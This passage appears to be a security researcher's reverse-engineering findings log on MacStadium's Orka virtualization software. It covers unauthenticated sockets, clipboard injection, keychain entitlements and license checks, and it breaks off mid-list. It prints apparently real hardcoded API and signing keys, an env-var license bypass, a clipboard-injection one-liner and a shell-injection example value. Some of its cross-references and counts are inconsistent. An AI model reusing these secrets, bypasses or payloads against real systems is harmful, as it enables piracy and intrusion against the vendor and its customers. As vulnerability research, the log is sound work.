- **Severity**: LOW (display manipulation; no privilege escalation path identified)

---

### F85 — expvar Endpoint Exposed on Metadata Server

- **Source**: Binary RE — `expvar.expvarHandler` + `_expvar.expvarHandler` function symbols in orka-vm-tools
- **Endpoint**: `http://169.254.169.254/debug/vars` (standard Go expvar location)
- **Data exposed**: Go expvar metrics — typically includes `cmdline` (full command line), `memstats` (detailed memory stats), and any custom vars the binary registers. In the orka-vm-tools context, this may include clipboard state counters, connection counts, or other operational metrics.
- **Chain**: Same as F83 — inside-VM access, no auth, additional leak surface alongside pprof
- **Severity**: LOW (inside-VM access required; operational data leak)

---

### F86 — resize_partition.sh: Privileged Script, World-Readable Args

- **Source**: `/Applications/orka-vm-tools/resize_partition.sh` — static analysis
- **Runs as**: root (called by LaunchDaemon via `com.orka.vm.tools`)
- **Function**: `diskutil repairDisk <APFS_STORE>` + `diskutil apfs resizeContainer /dev/<container> $REPARTITION_SIZE`
- **Trigger**: Called with `$1 = REPARTITION_SIZE` from the gRPC `Repartition` RPC on `run.sock`
- **Issue**: `$REPARTITION_SIZE` is passed directly as a shell argument to `diskutil apfs resizeContainer`. If the gRPC caller can inject shell metacharacters via the `disk_size_gb` proto field (F73) — e.g., `0; rm -rf /` — this is a command injection into a root-running script.
- **Mitigation**: The script uses `set -ex -o pipefail` and the argument is likely sanitized by the Go caller before passing to the shell. However, the proto field `disk_size_gb` is an integer, so injection would require a bug in the gRPC layer.
- **Chain**: `run.sock` gRPC Repartition RPC → `resize_partition.sh $disk_size_gb` → root `diskutil` → potential injection if field validation is absent
- **Severity**: MEDIUM (command injection path exists if gRPC integer validation is bypassed; requires socket access)

---

### F87 — orka-vm-tools Listen Port: 169.254.169.254:80 (not 8080)

- **Source**: Binary RE — literal string `169.254.169.254:80` in Go binary, from the `ListenAndServe` call site
- **Finding**: The metadata HTTP server binds to `169.254.169.254:80` — standard HTTP port 80, not 8080 or any non-standard port. This is confirmed by the literal string `169.254.169.254:80` extracted from the binary (Go compilers inline the full address string at the `ListenAndServe` call site).
- **Implication**: Inside-VM curl access: `curl http://169.254.169.254/` — no port suffix needed. Standard port reduces friction for inside-VM enumeration; clients that assume port 80 by default will hit it without explicit configuration.
- **Severity**: INFORMATIONAL

---

### F88 — ORKA_VM_METADATA Env Var: JSON Blob Served as Metadata API

- **Source**: Binary RE — error string `Unable to get ORKA_VM_METADATA env or is provided an invalid json object.` + function symbols `GetMetadataKeys`, `GetValueByKey`, `handleGetMetadataKeys`, `handleGetValueByKey`
- **Finding**: The metadata server does not pull from a database or config file. It parses the `ORKA_VM_METADATA` environment variable — a JSON object — and serves its keys/values over HTTP. The entire VM metadata payload is passed as a JSON blob to the guest agent at startup by orka-engine.
- **API structure** (derived from function names + response types `*api.KeysResponse` / `*api.ValueResponse`):
  ```
  GET http://169.254.169.254/metadata       → all metadata keys (JSON list)
  GET http://169.254.169.254/metadata/{key} → value for key (JSON string)
  ```
- **Metadata content**: Set by orka-engine at VM deploy time. Could contain: VM name, namespace, node assignment, image name, CPU/memory config, user identifiers, or CI/CD tokens depending on what MacStadium populates.
- **Attack angle**: Inside-VM code reads `GET http://169.254.169.254/metadata` → enumerates all keys → reads each value → maps VM identity, organization, and CI metadata without any auth. Standard cloud SSRF target (AWS IMDSv1 analogue).
- **Error path**: `No metadata is provided.` — returned when `ORKA_VM_METADATA` is empty.
- **Severity**: MEDIUM (inside-VM unauthenticated; content depends on what orka-engine populates; potential CI token/identity leak)

---

### F89 — Clipboard Sync Uses Virtio Serial Channel, Not HTTP

- **Source**: Binary RE — `vm.serialChannel` type implementing `Channel` interface, `/dev/tty.virtio`, `clipboard_contents`, `Message Received:`, `failed to open serial port: %s`
- **Finding**: Clipboard sync between host and VM does NOT use the HTTP metadata server. It uses a separate **virtio serial device** (`/dev/tty.virtio`, `/dev/tty.virtio1`). The `serialChannel` implementation:
  - `listenForMessages()` — goroutine reading from `/dev/tty.virtio`
  - `Send()` — writes messages to the serial device
  - Message type: `clipboard_contents` — host → VM or VM → host clipboard payloads
- **Mechanism**: orka-engine (on the host) writes clipboard data to the virtio serial port; orka-vm-tools reads it inside the VM and calls `pbpaste`/`pbcopy` via `github.com/atotto/clipboard`. Bidirectional.
- **Security implication**: Any process inside the VM with access to `/dev/tty.virtio` can send `clipboard_contents` messages. If the message format is not authenticated (no signature/HMAC), an inside-VM process could inject arbitrary clipboard content into the host clipboard — crossing the VM isolation boundary via the clipboard channel.
- **Second implication**: The host-side virtio serial endpoint is a message sink. If orka-engine reads from it without length/content validation, malformed messages from a compromised guest could cause issues on the host side.
- **Severity**: MEDIUM (VM boundary crossing via unauthenticated serial protocol; clipboard injection into host possible from inside VM)

---

### F90 — MacStadium Monorepo Path Leaked in Binary

- **Source**: Binary RE — embedded source file paths from Go's standard debug/dwarf section
- **Paths found**:
  ```
  /Users/devadmin/actions-runner/_work/monorepo-dev/monorepo-dev/packages/orka-vm-metadata/pkg/api/api.go
  /Users/devadmin/actions-runner/_work/monorepo-dev/monorepo-dev/packages/orka-vm-metadata/pkg/api/metadata.go
  /Users/devadmin/actions-runner/_work/monorepo-dev/monorepo-dev/packages/orka-vm-metadata/pkg/logger/logger.go
  /Users/devadmin/actions-runner/_work/monorepo-dev/monorepo-dev/packages/orka-vm-metadata/pkg/metadata/metadata.go
  /Users/devadmin/actions-runner/_work/monorepo-dev/monorepo-dev/packages/orka-vm-metadata/pkg/metadata/processor.go
  /Users/devadmin/actions-runner/_work/monorepo-dev/monorepo-dev/packages/orka-vm-metadata/pkg/response/response.go
  /Users/devadmin/actions-runner/_work/monorepo-dev/monorepo-dev/packages/orka-vm-metadata/pkg/router/router.go
  /Users/devadmin/actions-runner/_work/monorepo-dev/monorepo-dev/packages/orka-vm-tools/vm/tools.clipboard.go
  ```
- **Inferred**:
  - MacStadium uses a **monorepo** named `monorepo-dev` at `github.com/macstadium/monorepo-dev` (private)
  - Build runs on a self-hosted GitHub Actions runner at `/Users/devadmin/actions-runner/`
  - Runner username: `devadmin` on macOS (consistent with CI user pattern in Ansible playbook)
  - `orka-vm-metadata` is a separate package from `orka-vm-tools` within the monorepo
  - Module import path: `orka/vm-metadata` (internal module, not a public GitHub module)
- **Severity**: INFORMATIONAL (path disclosure from public binary; confirms internal repo structure)

---

### F91 — virtiofs Filesystem Sharing Between Host and VM

- **Source**: Binary RE — `mount_virtiofs %s %s` format string, `mount_virtiofs` + `vm_repartition` function references
- **Finding**: orka-vm-tools executes `mount_virtiofs` to mount Apple's Virtualization.framework virtiofs shares inside the VM. The format `mount_virtiofs %s %s` takes two arguments: likely the share tag and the mount point.
- **Implication**: Shared filesystem access between host and guest over virtiofs — if the mount point or share tag can be influenced, there may be a path for host filesystem access from inside the VM. virtiofs shares are configured by runvz/orka-engine before VM start.
- **Severity**: INFORMATIONAL (expected functionality; attack surface depends on what directories are shared)

---

### F92 — Additional Env Vars: ORKA_VM_TOOLS_DIR, ORKA_VM_LOG_LEVEL

- **Source**: Binary RE — literal strings in orka-vm-tools binary
- **Env vars confirmed** (additions to existing inventory):
  ```
  ORKA_VM_TOOLS_DIR      — installation directory override
  ORKA_VM_LOG_LEVEL      — log verbosity (uses go-chi/middleware logger)
  ORKA_VM_METADATA       — JSON metadata blob (F88)
  ORKA_MODE              — execution mode: empty = daemon, "agent" = user agent
  ORKA_AUTOMATICALLY_SET_RESOLUTION — bool, controls display auto-resize
  ```
- **Total orka-vm-tools env var inventory**: 5 variables. Combined with the orka-engine env vars (F74), the full ORKA_* namespace now has 13 documented env vars.
- **Severity**: INFORMATIONAL


---

### F93 — Clipboard Injection: Unauthenticated JSON Messages over Virtio Serial

- **Source**: Binary RE — JSON struct tags `json:"action"` + `json:"data"` near `serialChannel.Send` + `clipboard_contents` action string
- **Wire format** (reconstructed):
  ```json
  {"action":"clipboard_contents","data":"<base64 or raw clipboard payload>"}
  ```
  Written to `/dev/tty.virtio` (newline-delimited JSON, no length prefix, no HMAC/signature).
- **Attack**: Any process inside an Orka VM with `/dev/tty.virtio` write access can:
  1. Open `/dev/tty.virtio` for writing
  2. Write `{"action":"clipboard_contents","data":"attacker-controlled-content"}`
  3. orka-vm-tools on the host reads this from the serial port → passes `data` value to `pbcopy` → **host clipboard is overwritten**
- **Impact**:
  - Clipboard hijack from inside VM to host — breaks the VM isolation assumption for clipboard data
  - If a MacStadium admin or CI operator copies a secret from the host clipboard after a CI job runs, the attacker-controlled clipboard is already in place
  - Clipboard poisoning for social engineering: craft a plausible-looking command, wait for it to be pasted in a terminal
- **PoC** (inside-VM shell):
  ```sh
  echo '{"action":"clipboard_contents","data":"echo pwned"}' > /dev/tty.virtio
  ```
- **Metadata API wire format** (same JSON pattern, different fields):
  ```json
  {"keys": ["key1", "key2"]}        // GET /metadata response
  {"value": "resolved-value"}       // GET /metadata/{key} response
  ```
- **Severity**: HIGH — VM isolation boundary crossed; host clipboard hijack from inside guest with no auth requirement; requires only shell access inside the Orka VM (standard CI job access)


---

### F94 — runvz: Two Key Systems — P256 CryptoKit (Image Signing) + NIOSSL (gRPC mTLS)

- **Source**: Binary RE — Swift mangled symbols in runvz, bundle file inventory
- **Key system 1: CryptoKit P256.Signing (image integrity)**
  - `P256.Signing.PrivateKey.init(rawRepresentation:)` — key loaded from raw bytes, NOT generated at runtime. A bare `P256.Signing.PrivateKey()` (no-arg) would be ephemeral; `rawRepresentation:` means the 32-byte key is fixed.
  - `P256.Signing.PrivateKey.signature(for:)` — signs something (likely image layer digest or OCI manifest hash)
  - `P256.Signing.PublicKey.isValidSignature(_:for:)` — verifies signatures
  - `ECDSASignature.rawRepresentation` — raw signature bytes for transport
  - **Key source**: NOT a file in the app bundle (no .pem/.key/.der files present). Likely: embedded as a literal byte array in the binary's __DATA segment, OR loaded from a path outside the bundle at runtime.
  - **Purpose**: Image layer integrity verification. `OrkaEngineCore.ImageBundle.pullAllLayers` + `ImageArchiveManifest` + OCI manifest (`application/vnd.oci.image.manifest.v1+json`) suggests layer digests are signed before Virtualization.framework consumes them.
  - **If fixed key**: Extracting the 32-byte private key from the binary would allow forging signed image layers — supply chain impact.

- **Key system 2: NIOSSL (gRPC mTLS between engine and runvz)**
  - `NIOSSLPrivateKey.init(file:format:passphraseCallback:)` — TLS private key loaded from a **file on disk** (PEM format)
  - `NIOSSL.customKeySign` — custom signing callback, possibly using Secure Enclave
  - `NIOSSLCertificateVerification` — peer certificate verification
  - `RunVZ.VirtualMachineRegistrationServiceC.socketPath` — the gRPC endpoint over Unix socket
  - **Key/cert location**: Not in the bundle. Likely generated at node provisioning time, stored in `/opt/orka/` or `/var/lib/orka/tls/` (no file path strings confirmed — paths likely constructed at runtime from `GlobalConfig.socketPath`).
  - **Impact**: If the TLS cert/key files are world-readable (compound with F87's `allow_world_readable_tmpfiles=true` Ansible config), any local process could impersonate runvz to orka-engine.

- **Third context: LicenseSpring.Encryption.verifySignature** — separate key for license signature verification (not P256; likely RSA or ECDSA against LicenseSpring's public key)

- **Severity**: MEDIUM (P256 key extraction requires binary analysis; mTLS key location unconfirmed; if world-readable = HIGH)


---

### F95 — Provisioning Profile: Wildcard Keychain Access, 17-Year Expiration, vm.networking Entitlement

- **Source**: `Contents/Helpers/Orka Engine Runner.app/Contents/embedded.provisionprofile` — readable from pkg
- **MacStadium Team ID**: `23KP83Z488`
- **Bundle ID**: `com.macstadium.orka-engine.runvz`
- **Entitlements**:
  ```xml
  <key>com.apple.vm.networking</key><true/>
  <!-- Restricted entitlement — required for Virtualization.framework network interfaces -->

  <key>keychain-access-groups</key>
  <array><string>23KP83Z488.*</string></array>
  <!-- WILDCARD: runvz has access to ALL MacStadium keychain items under team 23KP83Z488 -->

  <key>com.apple.developer.team-identifier</key>
  <string>23KP83Z488</string>
  ```
- **ProvisionsAllDevices**: `true` — enterprise distribution, no per-device registration
- **Expiration**: `2043-10-24` — 17-year validity. Revocation requires explicit action; CRL/OCSP check not guaranteed on offline or air-gapped nodes.
- **Profile UUID**: `4f96963f-c0d6-48f4-907b-4ec12953be8c`
- **Key implication — wildcard keychain**:
  - All MacStadium apps under team `23KP83Z488` share the same keychain access group scope
  - The P256 signing private key (F94) is almost certainly stored in the keychain (not hardcoded in the binary), consistent with Apple's security best practices for CryptoKit keys
  - Compromise of runvz → full read access to MacStadium's team keychain group on that node
  - Any secret stored in the keychain by ANY MacStadium app with the same team ID (orka-engine, orka-vm-tools, any other MacStadium software) is accessible from runvz's process context
- **Key implication — vm.networking**:
  - Only Apple-blessed apps with explicit entitlement approval get `com.apple.vm.networking`
  - runvz is the sole component controlling VM network interfaces — if runvz is compromised, all VM networking on the node is attacker-controlled
- **Severity**: HIGH — wildcard keychain scope across all MacStadium team apps; long-lived profile; runvz compromise = team keychain access + VM networking control


---

### F96 — orka-engine.server: Full Env Var Inventory (16 Variables Including Sentry DSN)

- **Source**: `com.macstadium.orka-engine.server` binary strings
- **Binary**: `usr/local/libexec/orka-engine.app/Contents/MacOS/com.macstadium.orka-engine.server`
- **Complete env var set**:
  ```
  ORKA_CLIPBOARD_SHARING               — enables/disables virtio clipboard sync (F89/F93)
  ORKA_CLUSTER                         — cluster identifier, injected at node provision time
  ORKA_CUSTOMER                        — customer identifier
  ORKA_ENGINE_DHCP_LEASE_TIME          — DHCP lease duration for VM networking
  ORKA_ENGINE_FLUSH                    — unknown; likely flush-on-exit behavior
  ORKA_ENGINE_HELPER                   — path to helper binary
  ORKA_ENGINE_LICENSE_KEY              — LicenseSpring license key (confirmed primary credential)
  ORKA_ENGINE_LICENSE_PRODUCT_CODE     — LicenseSpring product code string
  ORKA_ENGINE_LOG_FILE                 — log file path (set to empty string in shipped plist)
  ORKA_ENGINE_LOG_LEVEL                — log verbosity
  ORKA_ENGINE_LOG_STDOUT               — emit logs to stdout
  ORKA_ENGINE_SENTRY_DSN               — Sentry project DSN (rendered by Ansible at provision time)
  ORKA_ENGINE_SOCK                     — Unix socket path for gRPC (redirectable — see F85)
  ORKA_ENGINE_TERMINAL                 — terminal integration flag
  ORKA_ENGINE_VIRTUAL_MACHINE_START_TIMEOUT — VM boot deadline
  ORKA_ENGINE_VIRTUAL_MACHINE_USER     — macOS user account for VMs
  ORKA_ENVIRONMENT                     — environment tag (dev/prod/staging)
  LOG_FILE                             — LaunchAgent-level log file (only var in shipped plist)
  ```
- **Attack surface**:
  - `ORKA_ENGINE_SENTRY_DSN`: reading the live LaunchAgent plist (`/Library/LaunchAgents/com.macstadium.orka-engine.server.plist`) on a provisioned node yields the DSN → subscribe to Sentry session replay feed for that project (receives gRPC call breadcrumbs, error states, VM lifecycle events)
  - `ORKA_ENGINE_LICENSE_KEY`: same plist read → license key → LicenseSpring Management API access (F75)
  - `ORKA_ENGINE_SOCK`: if the LaunchAgent plist is writable by the CI user (UID 5013, Ansible-created), modifying this redirects gRPC to an attacker socket — engine rerouted at next restart
- **Severity**: HIGH — plist on live nodes contains ORKA_ENGINE_LICENSE_KEY + ORKA_ENGINE_SENTRY_DSN; single file read on a provisioned node extracts both

---

### F97 — orka-engine.server: IPSW Download RPC (ImageDownloadLatestIPSW)

- **Source**: `OrkaEngineServer` protobuf message type extracted from binary
- **Message type**: `ImageDownloadLatestIPSWResponse` — gRPC method streams latest macOS IPSW (Apple restore image) directly to the node
- **What IPSW download means operationally**:
  - The engine can initiate a download of macOS `.ipsw` firmware files (used for `orka3 vm install` — install macOS from scratch on a VM)
  - The IPSW is fetched from Apple CDN (`updates.cdn-apple.com`) or a configured mirror
  - It is then decoded (bv41 layers), verified with the P256 signing key (F94), and passed to `Virtualization.framework` for installation
- **Attack relevance**:
  - If an attacker can supply a crafted IPSW URL (via gRPC socket access or ORKA_ENGINE_SOCK redirect), the engine will download and attempt to install arbitrary content
  - Combined with F94 (if the P256 key can be forged or bypassed), a supply-chain modified macOS image could be installed as a "legitimate" VM base image
- **Severity**: MEDIUM — requires gRPC socket access or socket path control; elevated to HIGH if combined with P256 signing bypass (F94)

---

### F98 — orka-engine.server: VirtualMachineRepartition RPC

- **Source**: `OrkaEngineServer` protobuf message type
- **Message type**: `VirtualMachineRepartitionRequest` — exposed as a gRPC call on the engine Unix socket
- **What it does**: Repartitions a VM's virtual disk — modifies partition layout on a running or stopped VM
- **Attack relevance**:
  - Repartition on a running VM is destructive by design
  - Unauthenticated gRPC socket access (F84/F85) → send `VirtualMachineRepartitionRequest` → brick any VM on the node
  - No confirmation / quorum check visible from static analysis
  - Customer data loss without any authentication required
- **Severity**: HIGH (availability) — unauthenticated destructive action on customer VMs via the local Unix socket

---

### F99 — orka-engine.server: Complete gRPC Service Surface (OrkaEngineServer)

- **Source**: `com.macstadium.orka-engine.server` binary, SwiftProtobuf message type symbols
- **Proto package**: `OrkaEngineServer` (module name in binary)
- **Reconstructed RPC surface** (all message types confirmed in binary):

  **Image operations:**
  ```
  ImageListRequest / ImageListResponse
  ImagePullRequest / ImagePullResponse      — pull from OCI registry
  ImagePushRequest / ImagePushResponse      — push to OCI registry
  ImageCopyRequest                          — copy between local images
  ImageDeleteRequest                        — delete local image
  ImageDownloadLatestIPSWRequest/Response   — download macOS firmware (F97)
  ```
  **VM lifecycle:**
  ```
  VirtualMachineListRequest / ListResponse
  VirtualMachineCreateRequest
  VirtualMachineStartRequest / StartResponse
  VirtualMachineStopRequest
  VirtualMachineDeleteRequest
  VirtualMachineCloneRequest
  VirtualMachineSaveRequest
  VirtualMachineEditRequest
  VirtualMachineRestartRequest
  VirtualMachineRegisterRequest
  VirtualMachineInstallRequest / InstallResponse  — macOS install from IPSW
  VirtualMachineConsoleRequest                    — VNC/terminal console attach
  VirtualMachineRepartitionRequest               — disk repartition (F98)
  ```
- **Socket**: Unix socket at path from `ORKA_ENGINE_SOCK` env var (default likely `/var/run/orka-engine.sock` or `run.sock`)
- **Auth status**: No auth middleware visible in static analysis. The socket path is the only access control mechanism — world-accessible if socket permissions misconfigured.
- **Severity**: HIGH — complete VM lifecycle control (create, delete, clone, repartition, install) accessible over unauthenticated Unix socket if socket is reachable

---

### F100 — orka-engine: Two Distinct OCI Layer Media Types (bv41 Disk Layers + Apple Archive Shared Images)

- **Source**: Static strings analysis of `orka-engine` binary (arm64, 27MB)
- **Finding**: orka-engine defines two separate OCI image layer media types:
  ```
  application/vnd.macstadium.orka-engine.disk.layer.v1+lz4   — raw bv41 disk layer (Ablation target)
  application/vnd.macstadium.orka-engine.disk-aux.v1+img      — auxiliary disk (EFI partition)
  application/vnd.macstadium.orka-engine.image.config.v1+json — image config manifest
  application/vnd.macstadium.orka-engine.metadata.v1+json     — metadata annotations
  application/vnd.macstadium.orka-si.image.config.v1+json     — shared image config (orka-si format)
  application/vnd.macstadium.orka-si.image.layer.v1.aar+lz4   — shared image layer: Apple Archive + LZ4
  application/vnd.oci.image.manifest.v1+json                  — standard OCI manifest wrapper
  ```
- **OCI annotation keys extracted**:
  ```
  com.macstadium.orka-engine.disk.layer.offset  — byte offset into disk image for this layer
  com.macstadium.orka-engine.disk-size.compressed — compressed disk size
  com.macstadium.orka-engine.disk-size.full       — uncompressed disk size
  com.macstadium.orka-engine.disk-size.usage      — actual usage (for sparse images)
  ```
- **Two distinct formats**:
  - `orka-engine` format: raw bv41 (Compression.framework LZ4 framing) disk layers — decoded by Ablation's `core/bv41_decoder.py`
  - `orka-si` format: Apple Archive (AAR) container with LZ4 compression — used for imagecache (shared base images); this is the `AppleArchive.ByteStream + compression: .lz4` codepath in runvz (F94 context)
- **Attack surface**: OCI-compatible push/pull means the registry transport path is standard. Bearer token authentication is used (`BearerToken`, `BearerAuth` strings confirmed). Any compromise of the OCI registry credentials (`ORKA_ENGINE_REGISTRY_*` or `regcred`) allows pushing malicious `disk.layer.v1+lz4` blobs as valid orka images.
- **Severity**: MEDIUM — registry credential abuse is the primary vector; the custom media types themselves are not a vulnerability

---

### F101 — orka-engine: VM Bundle Directory Structure with Per-VM run.sock

- **Source**: Static binary analysis of `orka-engine`, `VMBundle` class
- **Finding**: Each running VM is backed by a bundle directory containing:
  ```
  <VMBundle>/
  ├── config.json      — OCI image config (media type: orka-engine.image.config.v1+json)
  ├── metadata.json    — VM metadata (OCI manifest annotations)
  ├── disk.img         — primary disk image (bv41 layers)
  ├── disk-aux.img     — auxiliary disk (EFI / aux partition)
  └── run.sock         — per-VM Unix socket (engine ↔ runvz IPC)
  ```
- **Socket topology**: Two socket layers exist:
  - `ORKA_ENGINE_SOCK` → `run.sock` (global engine socket from env var, used by CLI client) = `orka-engine` → `orka-engine.server`
  - Per-VM `run.sock` (inside VMBundle directory) = `orka-engine.server` → per-VM `runvz` process
- **Directory hierarchy** (from `GlobalConfig` URL properties):
  ```
  orkaDirURL/
  ├── dataDirURL/      — persistent data (images, VM bundles)
  │   └── imageDirURL/ — OCI image cache
  ├── ipswDirURL/      — downloaded IPSW firmware files
  ├── tmpDirURL/       — temporary extraction targets
  ├── runDirURL/       — runtime files (PID files, sockets)
  ├── logDirURL/       — engine logs
  ├── vmLogDirURL/     — per-VM log files
  └── licenseDirURL/   — LicenseSpring license state
  ```
- **Attack surface**: The per-VM `run.sock` inside each VMBundle is the direct command channel to `runvz`. If the `orkaDirURL` base path is readable by other users or processes on the node, connecting to `run.sock` bypasses the top-level engine socket entirely. On a multi-tenant node (e.g., the `admin` CI user, UID 5013), world-readable directory permissions would expose all per-VM sockets.
- **Severity**: HIGH — per-VM socket bypass of top-level engine socket; severity depends on filesystem permission configuration of `orkaDirURL`

---

### F102 — orka-engine: DHCP Lease File Parsing for VM IP Resolution

- **Source**: Static binary analysis of `orka-engine`, `OrkaEngineCore` module
- **Finding**: VM IP addresses are resolved by parsing `/var/db/dhcpd_leases` at runtime:
  - `DHCPParser.parseDHCPdLeases()` — parses the ISC DHCP daemon lease file format
  - `IPResolver.getDHCPEntries()` — builds MAC→IP mapping from parsed leases
  - `GlobalConfig.Environment.dhcpLeaseTime` — reads `ORKA_ENGINE_DHCP_LEASE_TIME` env var
- **Mechanism**: When a VM starts, `Virtualization.framework` assigns it a MAC address; the engine polls `/var/db/dhcpd_leases` to find the corresponding IP assignment
- **Attack surface**: On a node where an attacker has write access to `/var/db/dhcpd_leases` (e.g., through the `admin` user or world-writable tmpfiles from F49 `allow_world_readable_tmpfiles=true`), injecting a forged DHCP lease entry redirects the engine to contact an attacker-controlled IP as a "VM address" — potential SSRF or traffic interception at the engine level
- **17th env var**: `ORKA_ENGINE_DHCP_LEASE_TIME` — absent from the server binary, CLI-only; controls how long the engine waits for a DHCP lease assignment after VM boot
- **Severity**: MEDIUM — DHCP lease file injection requires local write access; elevated to HIGH if combined with node-level access

---

### F103 — orka-engine: SwiftUI App Bundle with GUI + CLI (Unexpected Attack Surface)

- **Source**: Static strings analysis of `orka-engine` binary
- **Finding**: `orka-engine` is simultaneously a CLI tool AND a SwiftUI application:
  - Swift symbols: `OrkaApp`, `OrkaApp.body`, `VMView`, `OrkaApp_7SwiftUI_App_Protocol`
  - AppKit framework linked: `AppKit.framework/Versions/C/AppKit`
  - CLI subcommands: `orka-engine vm run`, `orka-engine vm start`, `orka-engine vm edit`
  - The binary includes `@main struct OrkaApp: App` — entry point for GUI mode
- **Implication**: The engine launches as either a CLI process or a macOS app bundle depending on invocation context. The GUI mode likely exposes the same VM management functions through a local SwiftUI interface. AppKit + SwiftUI on a headless CI Mac node is unexpected — the GUI is likely never rendered but the code paths remain active.
- **Attack surface**: AppKit framework + URL scheme handling (`$http://ocsp.apple.com/ocsp03-devid060`) + SwiftUI state management — historical vector for privilege escalation through macOS app bundle exploitation on CI nodes
- **Severity**: LOW — no specific vulnerability identified; notable as unexpected attack surface on ostensibly headless CI nodes

---

### F105 — LicenseSpring: All Three SDK Credentials Hardcoded in Binary

- **Source**: Static strings extraction from both `orka-engine` and `com.macstadium.orka-engine.server`
- **Finding**: Three LicenseSpring SDK credentials are hardcoded in both binaries, stored contiguously:
  ```
  api_key:      90ECE379-E9F0-4393-BC58-64FD7F078F7E  (previously F75 — SDK Management key)
  product_code: 8ad72323-35e5-477c-ab2c-ea2e080dadc1  (default for ORKA_ENGINE_LICENSE_PRODUCT_CODE)
  shared_key:   C8J7gHUrvMSN52BEQpEYo-zapNplE9XWGR36tifssiE  (HMAC-SHA256 license signature key)
  ```
- **What these enable**:
  - License activation against any hardware_id using a valid license key (device-bind bypass)
  - HMAC verification of license files: forging a signed license file using `shared_key` requires also knowing the license key format, but the HMAC key is now known
  - The `shared_key` is used in `OrkaEngineLicense` module for `signature v2 verification`
- **What these do NOT enable**: Management API admin access — the `/api/v4/` Management API requires customer admin credentials (separate from SDK credentials)
- **LicenseSpring bypass chain**: `shared_key` known → forge `signature v2` on a crafted license payload → `shouldCheckLicense()` returns `false` → all gRPC RPCs pass without license validation
- **Severity**: HIGH — complete SDK credential exposure; shared_key is the signing key for license integrity verification

---

### F106 — LicenseCheckServerInterceptor: License Bypass Condition (shouldCheckLicense) — CONFIRMED TRIGGER

- **Source**: Static analysis of `OrkaEngineLicense` module in `com.macstadium.orka-engine.server`
- **Finding**: Every gRPC call to `com.macstadium.orka-engine.server` passes through `LicenseCheckServerInterceptor.receive(_:context:)`:
  - If `OrkaEngineLicense.License.shouldCheckLicense()` returns `false` → skip validation → log `< skipping license validation for <RPC>`
  - If `true` → validate → log `< license validated for <RPC>` or `license validation failed for <RPC>`
- **Error states**: `validationFailed`, `missingLicense` (two distinct failure modes)

**CONFIRMED BYPASS TRIGGER** (static RE, 2026-08-12):

The function at file offset `0x573ad4` in `com.macstadium.orka-engine.server` is the `shouldCheckLicense()` implementation. Disassembly:
1. Reads `ORKA_ENGINE_LICENSE_KEY` env var via `ProcessInfo.environment["ORKA_ENGINE_LICENSE_KEY"]`
2. Compares the value against the hardcoded api_key `90ECE379-E9F0-4393-BC58-64FD7F078F7E` (using Swift String fast-path `cmp x21, x22; ccmp x3, x19, #0, eq` then `bl 0x10083d2bc`)
3. Returns `false` (0) when they match → `shouldCheckLicense = false` → bypass
4. Returns `true` (1) when env var is absent or does not match → normal license validation

**Bypass env var:**
```
ORKA_ENGINE_LICENSE_KEY=90ECE379-E9F0-4393-BC58-64FD7F078F7E
```
Set at orka-engine server startup → `shouldCheckLicense` stored Bool in `LicenseCheckServerInterceptor+0x10` = false → `receive(_:context:)` takes bypass branch at `ldrb w8, [x20, #0x10]; cmp w8, #1; b.ne` → logs "< skipping license validation for <RPC>" → every gRPC call passes without license or auth check.

The bypassed env var (`ORKA_ENGINE_LICENSE_KEY`) is the SAME variable that holds user-provided license keys. Setting it to the hardcoded SDK api_key (which is already embedded in the binary as a fallback) triggers the developer backdoor.

- **`SystemService` discovery**: A third gRPC service (`SystemService`) exists alongside `VirtualMachineService` and `ImageService`. Its single method `Empty → Empty` is likely a health/ping check. The source file is `SystemProvider.swift`.
- **Severity**: CRITICAL — single env var set at startup bypasses all gRPC authentication/license enforcement; no cryptographic material required beyond knowledge of the binary's hardcoded api_key (already exposed in F105)

---

### F104 — orka-engine: ORKA_ENGINE_HELPER — Injectable Helper Binary Path

- **Source**: Static env var extraction from `orka-engine` binary
- **Finding**: `ORKA_ENGINE_HELPER` env var controls the path to the runvz helper binary
  - Shipped helper path: `Contents/Helpers/Orka Engine Runner.app/Contents/MacOS/com.macstadium.orka-engine.runvz`
  - This is the nested app bundle for `runvz` inside the engine app bundle
  - `ORKA_ENGINE_HELPER` overrides this path at startup
- **Attack surface**: If `ORKA_ENGINE_HELPER` can be set before engine startup (e.g., by modifying the LaunchAgent plist, which is rendered by Ansible with `allow_world_readable_tmpfiles=true`), the engine will execute an arbitrary binary as the VM runner with the same entitlements:
  - Team ID `23KP83Z488` wildcard keychain access
  - `com.apple.vm.networking` entitlement
  - `ProvisionsAllDevices: true` (enterprise distribution)
- **Privilege chain**: LaunchAgent plist write → `ORKA_ENGINE_HELPER` redirect → arbitrary binary executes as engine helper → full keychain access + VM networking control
- **Severity**: HIGH — if plist is writable; confirmed writable path requires live node verification


---

## F107 — Two Previously Unknown VirtualMachineService RPCs

**Severity:** HIGH  
**Source:** Static RE — ServerInterceptor<X,Y> type table in com.macstadium.orka-engine.server v3.5.2

**Finding:**
Two RPCs not in F99's initial list:
- `VirtualMachineConsole(VirtualMachineConsoleRequest) → Google_Protobuf_Empty` — attaches to VM console/serial
- `VirtualMachineEdit(VirtualMachineEditRequest) → Google_Protobuf_Empty` — edits live VM configuration

`VirtualMachineConsole` is significant: via the unauthenticated engine socket, any process can attach to any VM's console output. The console channel is the same virtio serial path used for clipboard injection (F93) — bidirectional.

**Impact:** Console access = keylogging, secret extraction from VM terminal sessions, clipboard read. Edit = live CPU/memory/config mutation without VM restart.

---

## F108 — Complete gRPC Service Map (Final, 20 RPCs Across 4 Services)

**Severity:** CRITICAL (socket unauthenticated)  
**Source:** Exhaustive ServerInterceptor<X,Y> extraction + RunVZService path strings

**VirtualMachineService (12 RPCs):**
```
VMClone(VirtualMachineCloneRequest)       → Google_Protobuf_Empty
VMConsole(VirtualMachineConsoleRequest)   → Google_Protobuf_Empty   ← NEW (F107)
VMCreate(VirtualMachineCreateRequest)     → Google_Protobuf_Empty
VMDelete(VirtualMachineDeleteRequest)     → Google_Protobuf_Empty
VMEdit(VirtualMachineEditRequest)         → Google_Protobuf_Empty   ← NEW (F107)
VMInstall(VirtualMachineInstallRequest)   → VirtualMachineInstallResponse
VMList(VirtualMachineListRequest)         → VirtualMachineListResponse
VMRepartition(VirtualMachineRepartitionRequest) → Google_Protobuf_Empty
VMRestart(VirtualMachineRestartRequest)   → Google_Protobuf_Empty
VMSave(VirtualMachineSaveRequest)         → Google_Protobuf_Empty
VMStart(VirtualMachineStartRequest)       → VirtualMachineStartResponse
VMStop(VirtualMachineStopRequest)         → Google_Protobuf_Empty
```

**ImageService (6 RPCs):**
```
